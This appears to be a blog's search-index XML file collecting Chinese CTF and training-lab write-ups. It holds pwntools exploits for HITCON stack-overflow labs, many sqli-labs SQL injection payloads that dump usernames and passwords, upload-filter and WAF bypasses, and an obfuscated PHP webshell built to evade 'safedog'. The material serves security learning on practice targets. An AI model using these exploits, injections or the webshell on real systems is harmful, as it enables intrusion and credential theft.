<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hitcon_lab4</title>
    <url>/2019/04/24/Hitcon-lab4/</url>
    <content><![CDATA[<p>lab4是一道 return to libc 的题，</p>
<pre><code>首先checksec一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc067abaa659.png" alt></p>
<pre><code>可以看到没有开栈保护，开了NX了，可以栈溢出

file 一下 ret2lib ，返回32位

用ida打开文件分析一下</code></pre><a id="more"></a>

<p><img src="https://i.loli.net/2019/04/24/5cc068d80b6c5.png" alt></p>
<pre><code>这里两个地方值得注意：
    1、see_something()这个函数可以将你输入的地址找到其在运行中的真实地址

    2、像read，puts这样简单的函数可以被用来寻找偏移量

通过这两点可以用see_something()这个函数，将puts函数的真实地址返回出来

接下来就是找到libc的真实地址，计算偏移量，然后计算出system的真实地址，最后是计算出&quot;bin/sh&quot;真实地址拿到shell

exp：

#-*-coding:utf8-*-
from pwn import *

io = process(&quot;./ret2lib&quot;)
elf = ELF(&quot;./ret2lib&quot;)

libc = ELF(&quot;/lib32/libc.so.6&quot;)

puts_libc = libc.symbols[&quot;puts&quot;]
print &quot;puts_libc&quot; + hex(puts_libc) 

system_libc = libc.symbols[&quot;system&quot;]

binsh_libc = libc.search(&apos;/bin/sh&apos;).next()
print &quot;binsh_libc&quot; + hex(binsh_libc)

puts_plt = elf.plt[&quot;puts&quot;]
print &quot;puts_plt:&quot; + hex(puts_plt)

puts_got = elf.got[&quot;puts&quot;]
print &quot;puts_got:&quot; + hex(puts_got)

io.recvuntil(&quot;:&quot;)
io.sendline(str(puts_got))

io.recvuntil(&apos;0x&apos;)
puts_addr = int(io.reuntil(&apos;\n&apos;),16)
print &quot;puts_addr:&quot; + hex(puts_addr) //获得puts地址

main = 0x0804857d  //通过ida找出mian的地址

offset = puts_addr - puts_libc  //计算偏移量
system_addr = system_libc + offset  //system地址
binsh =  binsh_libc + offset  // bin/sh地址

io.recvuntil(&quot;:&quot;)
payload = &apos;a&apos; * 60
payload += p32(system_addr) + p32(main) + p32(binsh)


io.sendline(payload)
io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3cdfb2d.png" alt></p>
<pre><code>拿到shell</code></pre>]]></content>
      <categories>
        <category>逆向学习</category>
      </categories>
      <tags>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql函数用法</title>
    <url>/2019/07/25/Mysql%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<ol>
<li>count()：汇总数据函数</li>
<li>rand()：随机输出一个小于1的正数</li>
<li>floor()：把输出的结果取整</li>
<li>group by语句：把结果分组输出</li>
<li>concat()：连接两条语句</li>
</ol>
]]></content>
      <categories>
        <category>数据库学习</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>函数用法</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 备份文件 wirteup</title>
    <url>/2018/11/26/bugku%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6wirteup/</url>
    <content><![CDATA[<p>备份文件一般情况是在后缀名后加的<em>.swp，</em>.bak</p>
<p>利用==比较漏洞</p>
<p>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</p>
<a id="more"></a>
<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p>下列的字符串的MD5值都是0e开头的：</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>s214587387a</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hitcon lab1</title>
    <url>/2019/04/17/Hitcon-lab1/</url>
    <content><![CDATA[<p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
<pre><code>Hitcon这个是le3ding大佬推给我的


这个是GitHub地址 https://github.com/scwuaptx/HITCON-Training 有需要的可以自己git


——————————分割线——————————

lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb用法

用ida打开可以看到get_flag这个函数</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71ac83b8f4.png" alt></p>
<pre><code>然后查看sysmagic.c文件</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71f4f9d05f.png" alt></p>
<pre><code>经过观察，flag的生成与输入无关，因此可以通过调试直接获得flag

将if(password == magic)改为if(password ！= magic)

运行./sysmagic</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb7219445d51.png" alt></p>
]]></content>
      <categories>
        <category>逆向学习</category>
      </categories>
      <tags>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf web easy calc wirteup</title>
    <url>/2020/04/02/buuctf-web-easy-calc-wirteup/</url>
    <content><![CDATA[<p>此题考查php文件解析漏洞</p>
<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
<a id="more"></a>
<p>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。<br>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>        1.删除空白符<br>        2.将某些字符转换为下划线（包括空格）</p>
]]></content>
  </entry>
  <entry>
    <title>bugku 文件上传 wirteup</title>
    <url>/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/</url>
    <content><![CDATA[<p><img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/0rn6779r.bmp" alt><br>/很显然只允许上传图片格式，不允许上传PHP脚本，但是我们就是要上传一句话木马！<br>提交之后抓包</p>
<a id="more"></a>

<p>这道题是后缀名黑名单检测和类型检测<br>        1. 把请求头里面的Content-Type字母改成大写进行绕过<br>        2. .jpg后面加上.php5其他的都被过滤了好像<br> 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag</p>
<p>要修改三个地方：<br>1、扩展名filename<br>2、filename下面一行的Content-Type:image/jpeg<br>3、最最最重要的是请求头里的Content-Type字段，进行大小写绕过，也就是把multipart/form-data中任意一个字母改成大写即可<br> <img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/c2zulbcl.bmp" alt></p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 构造函数 wirteup</title>
    <url>/2018/11/28/bugku%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0wirteup/</url>
    <content><![CDATA[<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])

        print 'passwd can not be uname.';

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

        die('Flag: '.$flag);

    else

        print 'sorry!';

}
?>

<p> if (sha1($_GET[‘uname’]) === sha1($_POST[‘passwd’])</p>
<p>构造数组  ?id=margin&amp;uname[ ]=1</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcon  lab3 </title>
    <url>/2019/04/18/hitcon-lab3/</url>
    <content><![CDATA[<p>lab3这道题是一个基本的栈溢出</p>
<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，

由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路

首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><a id="more"></a>

<p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
<pre><code>地址为0x0804A060

直接上exp：

from pwn import *

&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;

context.log_level = &apos;debug&apos;

io = process(&apos;ret2sc&apos;)

sc = asm(shellcraft.sh())

ret2 = &apos;A&apos;*32 + p32(0x0804A060)

io.sendafter(&apos;Name:&apos;,sc)

io.sendafter(&apos;best:&apos;,ret2)

io.interactive()

直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
<pre><code>ok，拿到shell，直接cat flag就行了</code></pre>]]></content>
      <categories>
        <category>逆向学习</category>
      </categories>
      <tags>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 sqli wirteup</title>
    <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sqli-wirteup/</url>
    <content><![CDATA[<p>sql注入时，逗号被过滤后可用payload</p>
<p>select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97);</p>
<p>127’ UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#</p>
<p>select case when substring((select password from mysql.user where user=’root’) from 1 for 1)=’e’ then sleep(5) else 0 end #</p>
<p>substring((select password from mysql.user where user=’root’) from -1）=’e’</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 模拟上传 wirteup</title>
    <url>/2018/12/02/i%E6%98%A5%E7%A7%8B%E6%A8%A1%E6%8B%9F%E4%B8%8A%E4%BC%A0wirteup/</url>
    <content><![CDATA[<p>网址    <a href="http://106.75.72.168:2222/" target="_blank" rel="noopener">http://106.75.72.168:2222/</a></p>
<p>Sorry. You have no permissions.</p>
<p>既然没有提示，也没有其他的链接，那么可能有以下几种可能：<br>       1、敏感文件泄漏<br>       2、跳转<br>       <a id="more"></a><br>       3、cookie / session<br>       第一个想法在经过扫描器扫描之后就放弃了，因为只看到index.php，还有/upload/，但是在访问的时候是403<br>       第二个在抓包的时候也没有看到有跳转<br>       只剩下第三个</p>
<p>抓包发现cookie    Cookie: role=Zjo1OiJ0aHJmZyI7”</p>
<p>base64解码后   “ f:5:”thrfg”; 初步判断为rot13 thrfg为guest<br>将其改为base64(rot13(admin))</p>
<!-- $filename = $_POST['filename']; $data = $_POST['data']; -->

<p>发现源代码</p>
<p>post提交 filename=1.php&amp;data[]=<?php phpinfo();?>得到flag</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 file_get_contents wirteup</title>
    <url>/2018/12/05/i%E6%98%A5%E7%A7%8B-file-get-contents-wirteup/</url>
    <content><![CDATA[<p>file_get_contents 用于 将整个文件读入一个字符串</p>
<p>file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。</p>
<p>用法<br>$homepage = file_get_contents(‘filename’);</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>calc2</title>
    <url>/2019/04/19/calc2/</url>
    <content><![CDATA[<p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
<a id="more"></a>

<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面

接着打算直接cat flag，然而并不行

if(!empty($_GET)){
$str=$_GET[&quot;calc&quot;];
if(strpos($str,&quot;#&quot;)!==false)
    die;
if(strpos($str,&quot;`&quot;)!==false)
    die;
if(strpos($str,&quot;flag&quot;)!==false)
    die;

成了,flag被过滤了

嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
<pre><code>拿到flag</code></pre>]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>python库</title>
    <url>/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>import  random<br>随机整数：print random.randint(1,50)<br>随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)<br>随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</p>
<a id="more"></a>
<p>随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)<br>多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)<br>从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str<br>多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))<br>随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])<br>打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>php函数学习</title>
    <url>/2019/09/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>var_dump()<br>用于输出变量的相关信息。 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p>
<p>file_get_contents（）<br>把整个文件读入一个字符串中<br>函数是用于把文件的内容读入到一个字符串中的首选方法.file()函数同样可以</p>
<p>scandir（）<br>返回指定目录中的文件和目录的数组。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 sql绕过 wirteup</title>
    <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/</url>
    <content><![CDATA[<p>首先 要对id注入。首先试一下order by，发现错误，可能是关键字过滤。</p>
<p>试了试/**/还是不行，改用&lt;&gt;发现可以了</p>
<p>payload如下<br>、<br>?id=1 ord&lt;&gt;er by 3 –<br>?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 –<br>剩下的正常注入</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab Less(18-19)</title>
    <url>/2020/07/28/sqli-lab-Less-18-19/</url>
    <content><![CDATA[<p>Less -18<br>    这一关考察 Header Injection</p>
<pre><code>直接bp抓包分析</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/1.png" alt></p>
<a id="more"></a>

<pre><code>可以看到将user-agent改为aaa,右侧的回显也是aaa</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/2.png" alt></p>
<pre><code>加个单引号，可以看到发生了语法错误，证明这里存在注入点。

接下来就是正常注入，这里不知道为什么，如果你用注释符这里会报错如：</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/3.png" alt></p>
<pre><code>所以我只能用 &apos;1&apos; = &apos;1  进行闭合

-查表
aaa&apos; and updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x3a),1) and &apos;1&apos; = &apos;1

这里输出的数据被限制了，采用limit绕过

aaa&apos; and updatexml(1,concat(0x3a,(select table_name from information_schema.tables where table_schema = database() limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1

-查列
aaa&apos; and updatexml(1,concat(0x3a,(select column_name from information_schema.tables where table_name = &apos;users&apos; limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1

-查数据
aaa&apos; and updatexml(1,concat(0x3a,(select  username from users limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1</code></pre><p>————分割线————–</p>
<p>Less -19</p>
<pre><code>19关与18相同，只是注入位置变为Referer其他条件不变</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab Less20</title>
    <url>/2020/07/28/sqli-lab-Less20/</url>
    <content><![CDATA[<p>Less -20</p>
<pre><code>首先进行正常登陆</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/1.png" alt></p>
<a id="more"></a>    

<pre><code>通过bp抓包分析</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/2.png" alt><br><img src="/2020/07/28/sqli-lab-Less20/3.png" alt></p>
<pre><code>可以看到cookie被明文存放，刷新页面后发现cookie仍存在</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/4.png" alt></p>
<pre><code>在cookie处测试</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/5.png" alt></p>
<pre><code>发现产生报错信息，从而判断此处为注入点。
此处的后台流程为：
1、登陆后将uname写入Cookie。
2、在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取Cookie中字段uname。
3、在数据库中按username查询，若用户存在则将查询到用户id、username、password回显；若不存在…
由此我们可以使用union联合查询进行注入

-判断字段数
admin&apos; order by 4#

-判断回显字段
-admin&apos; union select 1,2,3#

-查表
-admin&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()#

-查列
-admin&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&apos;users&apos; #

-查数据
-admin&apos; union select 1,group_concat(username),3 from users #</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab less-17</title>
    <url>/2020/07/27/sqli-lab-less-17/</url>
    <content><![CDATA[<p>17关相比于之前关卡有很大不同，这一关注入点在密码上<br>一开始并没有任何思绪，于是只能观察源码</p>
<a id="more"></a>    
<p><img src="/2020/07/27/sqli-lab-less-17/image1.png" alt><br>从源码中可以看到：接收到用户POST的uname和passwd后，首先根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p>
<p>这一关使用报错注入<br>一般常用的报错注入有updatexml()、 extractvaule()和floor(),在这里floor()函数用不了<br>剩下两个都可以用，首先介绍下两个函数的用法<br>1、updatexml()<br> UpdateXML(xml_target, xpath_expr, new_xml)<br>这是updatexml()的基本用法，可以看出需要三个参数<br>第一个参数是目标是针对于xml文档<br>第二参数是xpath的表达<br> 第三个参数是将xpath表达式转换成什么，也就是替换查找到的符合条件的数据<br>2、 extractvaule()<br>extractvalue(目标xml文档，xml路径)<br>这里第二个参数的位置就是可以操作的地方<br>这里用采用第2种方法<br>–查表<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
<p>–查列<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
<p>–查用户名<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
<p>在查找用户名的时候出现了问题</p>
<p><img src="/2020/07/27/sqli-lab-less-17/image.png" alt>    </p>
<p>报错了，通过查询换代码发现，后台限制了对users表的查询，不可以查询此表，因此我们可以将其换一个名字</p>
<p>–绕过<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
<p>–查密码<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from (select password from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
<p>这里有一个问题， UpdateXML(xml_target, xpath_expr, new_xml)这个函数，第一、三参数是string类型</p>
<p>我测试时采用了这个payload ：aa’ and updataxml(0x7e,(concat(1,(select table_name from information_schema.tables where table_schema=database() limit 1,1),1),1)#<br>于是我的数据库中的密码的值全部变成了1。。。</p>
<p>在实际环境中，这样的测试肯定是不行的，所以尽可能不将参数设为int型</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs(1-4)</title>
    <url>/2019/12/25/sqli-lab/</url>
    <content><![CDATA[<p>前言</p>
<pre><code>最近在研究sql注入，sqli-labs是一个专业的sql注入练习平台，于是自己搭建了一个，记录一下学习过程。</code></pre><p>Less-1</p>
<p> 根据提示可以知道，这是一道单引号注入的题目<br> 首先他让我们输入ID<br><img src="/2019/12/25/sqli-lab/05ab1d2d3f4f5421f749a046d8f3a56.png" alt><br>    先get一个参数进行测试</p>
<a id="more"></a>    
<p><img src="/2019/12/25/sqli-lab/d336f99bd2f6e61ef828e16e4b4d2b0.png" alt><br>    正常回显，根据提示进行单引号测试<br><img src="/2019/12/25/sqli-lab/b8c6f552da136996e0fb2847121c8d2.png" alt><br>    可以发现已经报错，这里先把报错语句拿出来<br>    ‘’1’’ LIMIT 0,1’ at line 1<br>    这里首尾两个’是输出用的而 ‘1’’ 中的1’便是你输入的参数值<br>    将这个语句放入正常语句中进行分析<br>    select * from A where id =’1’’ limit 0,1<br>    可以发现正是由于id值中传入了一个 ‘ ,使得正常的语句多了一个 ‘ 发生了错误。<br>    所以我们可以利用这一点，构造我们需要的语句<br>    select * from A where id =’1’ 需要的注入语句 –+’ limit 0,1<br>    这样我们就可以通过不同的注入语句获得我们需要的信息<br>    注入的通常流程：<br>        1、确定现有sql语句到底查询了多少个字段以及各字段的类型<br>        2、确定了字段个数再查询显示位<br>        3、在从当前显示位上查询出当前数据库、当前用户等我们所需要的数据<br>    实际操作一下<br>    构造字段查询语句<br>    payload：’ order by 3 –+<br>    可以看到页面正常回显<br><img src="/2019/12/25/sqli-lab/3785c8fcbaff654858efb5899d54a93.png" alt><br>    将3改为4<br><img src="/2019/12/25/sqli-lab/a30015d7c3cbff602cc0443c9ffd91e.png" alt><br>    发生报错，证明只存在三个字段<br>    接着确定可以回显的字段<br>    payload：-1’ union select 1,2,3 –+<br><img src="/2019/12/25/sqli-lab/81e3539614352a2e5bf5eece18a765f.png" alt><br>    可以看到2，3被显示在页面上，也就是说我们要将查询语句构造在2，3号位才可以获得相应的数据<br>    下面列出几个常用的查询语句：<br>        1、查询表：-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_scheme= database() –+<br>        2、查询列：-1’ union selecr 1,group_concat(column_name),3 from information_schema.conluns where table_name=”users” –+<br>        3、查询字段：-1’ union select 1,group_concat(A,B,C),3 from users –+<br>    注：仅使用于MySQL数据库&gt;=5.0.1以上版本</p>
<p>——————-分割线——————</p>
<p>less-2 </p>
<pre><code>这一关，通过提示可以知道也属于报错注入，不过是int型，不需要进行单引号闭合了

其他与第一关的操作方法相同</code></pre><p>——————-分割线——————</p>
<p>less-3</p>
<pre><code>第三关与第一关类型完全一样，只不过闭合方式发生该变，只需要“ &apos; ”
改为“ &apos;) ” 其他与第一关相同。</code></pre><p>less-4</p>
<pre><code>同上，将只需要“ &apos; ”
改为“ &quot; ” 其他与第一关相同。</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>过狗一句话小技巧</title>
    <url>/2018/11/25/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<?php $poc="a#s#s#e#r#t"; 

$poc_1=explode("#",$poc);

$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];

$poc_2($_GET['s']) 

?>



<pre><code>1. s=print_r(scandir(&apos;./&apos;)) 然后读取flag.txt

2. s=print_r(glob(&quot;*.*&quot;)) 然后读取show_source(flag.txt)

3. 使用file_get_contents(flag.txt)读取文件

eg: 还有system(&apos;ls&apos;)的读取方法但是这里应该没有权限.</code></pre>]]></content>
      <categories>
        <category>SQl注入</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>注入技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab less (26-27)</title>
    <url>/2020/07/31/sqli-lab-less-26-27/</url>
    <content><![CDATA[<p>Less-26<br>    这一关变得更加严格，不仅过滤了or和and，而且过滤了空格以及注释符</p>
<p><img src="/2020/07/31/sqli-lab-less-26-27/1.png" alt></p>
<a id="more"></a>

<pre><code>通过观察后台源码发现过滤了这些

绕过and和or的方法可以用25关提到的，这里注释有一种没有被过滤   ;%00  这个注释方法很多都没有被过滤，如果#和-- 都被过滤的话可以试试这个。

空格可以用url编码替换：
1、%09 TAB 键（水平）
2、%0a 新建一行
3、%0b TAB 键（垂直）
4、%0c 新的一页
5、%0d return 功能
6、%a0 空格

不过windows对这些转义有点问题，我把这些都试了结果都绕不过去，在apache可以，如果是apache的服务器这些空格的替换是可以的，可以用联合查询进行注入。

这里由于我是windows，我采用了报错注入

payload：0&apos;||updatexml(0x7e,concat(0x7e,(select( group_concat(table_name))from(infoorrmation_schema.tables)where (table_schema=database()))),1);%00</code></pre><p><img src="/2020/07/31/sqli-lab-less-26-27/2.png" alt>    </p>
<pre><code>通过报错注入可以不需要绕过空格，可以用（）代替

或者通过盲注中不需要and的方法进行注入，不过盲注比较费力一些。

绕过后其他正常报错注入方法无异</code></pre><p>——————分割线———————</p>
<p>less-26a</p>
<pre><code>这一关与上一关的区别在于他不会将报错信息显示在页面上，这也就造成了报错注入无法使用，只能使用union联合查询


但由于我用的windows，空格无法绕过，所以我就没做。。。

不过看到其他的writeup除了无法进行报错注入，使用union联合查询与之前的步骤完全一致。

还有就是使用盲注的方法，也可以进行注入</code></pre><p>——————分割线———————    </p>
<p>less-27</p>
<pre><code>标题是过滤了union和select,后台代码</code></pre><p><img src="/2020/07/31/sqli-lab-less-26-27/3.png" alt>    </p>
<pre><code>。。。。。。

还是过滤了空格，不过and和or没有被过滤

这一关的思路与26关一致，可以使用报错注入，联合查询以及报错注入

在需要union和select的地方将其双写绕过即可</code></pre><p>less-27a</p>
<pre><code>这一关与26a相同不显示报错信息，与26a不同的是过滤的字变为了union 和 select ，双写绕过便可以

这里闭合方式为&quot;,其他与26a思路一致</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab less (21-22)</title>
    <url>/2020/07/31/sqli-lab-less-21-22/</url>
    <content><![CDATA[<p>Less -21</p>
<pre><code>首先进行正常登陆，发现界面与20关基本相同

不过在uname一处发生了变化</code></pre><p><img src="/2020/07/31/sqli-lab-less-21-22/1.png" alt></p>
<a id="more"></a>

<pre><code>我们输入的是admin 这里变成了 YWRtaW4=

通过观察确定这是base64编码

也就是说这一关将cookie值中的uname进行了base64加密，我们需要将提交的值进行base64加密即可

用bp抓包进行测试</code></pre><p><img src="/2020/07/31/sqli-lab-less-21-22/2.png" alt></p>
<pre><code>首先进行单引号测试，右侧出现了语句报错，发现闭合方式为&quot; &apos;) &quot;


明白了闭合方式及加密方法，剩下的与20关操作步骤相同，进行基本union查询即可。</code></pre><p>——————分割线———————</p>
<p>Less -22</p>
<pre><code>与21关完全操作步骤完全相同，只需要将&quot;  &apos;) &quot; 改为&quot; &quot; &quot;即可。</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab less 25</title>
    <url>/2020/07/31/sqli-lab-less-25/</url>
    <content><![CDATA[<p>Less -25</p>
<pre><code>这一个题的标题是ALL YOUR &apos;OR&apos; and &apos;AND&apos; belong to us

这个意思是所有的and 和 or都被过滤了，检查后台源码发现确实将这两个词过滤了    

既然用不了就换一个&amp;&amp;和||也可以表示成and 和or 的意思</code></pre><a id="more"></a>
<pre><code>或者利用双写进行绕过</code></pre><p><img src="/2020/07/31/sqli-lab-less-25/image.png" alt>    </p>
<pre><code>可以看到页面正常回显

